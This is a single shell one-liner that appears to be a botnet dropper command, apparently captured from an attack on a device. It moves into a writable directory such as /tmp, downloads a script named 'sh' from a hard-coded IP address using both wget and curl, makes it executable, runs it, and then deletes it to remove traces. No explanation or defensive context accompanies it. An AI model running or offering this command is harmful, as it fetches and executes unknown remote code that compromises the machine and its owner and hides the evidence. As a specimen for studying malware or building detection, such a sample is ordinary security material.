cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://149.91.88.123/sh; curl -O http://149.91.88.123/sh; chmod +x sh; ./sh; rm -rf sh
